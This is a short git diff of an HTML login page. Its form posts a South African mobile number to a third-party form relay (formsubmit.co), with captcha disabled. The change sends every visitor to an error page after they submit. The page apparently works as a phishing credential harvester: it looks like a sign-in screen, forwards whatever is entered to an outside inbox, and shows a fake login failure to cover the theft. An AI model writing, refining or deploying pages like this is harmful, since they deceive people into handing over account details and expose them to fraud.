@@ -5,7 +5,10 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Login Page</title>
   <link rel="stylesheet" href="sebono.css" />
-  
+  <style>
+    .page { display: none; }
+    .page.active { display: block; }
+  </style>
 </head>
 <body>
   <!-- Form Page -->
@@ -24,8 +27,7 @@
       <form id="login-form" action="https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21" method="POST">
         <!-- Hidden config fields -->
         <input type="hidden" name="_captcha" value="false" />
-        <input type="hidden" name="_error" value="?error=1" />
-        <!-- No _next to prevent success redirect -->
+        <input type="hidden" name="_redirect" value="?error=1" />
 
         <label for="mobile">Mobile Number</label>
         <input type="tel" id="mobile" name="mobileNumber" placeholder="+27 Mobile Number" required />
@@ -69,12 +71,9 @@
 
     window.addEventListener('DOMContentLoaded', () => {
       const error = getQueryParam('error');
-
       if (error === '1') {
-        // Show error page only
         document.getElementById('error-page').classList.add('active');
       } else {
-        // Default: show form
         document.getElementById('form-page').classList.add('active');
       }
     });
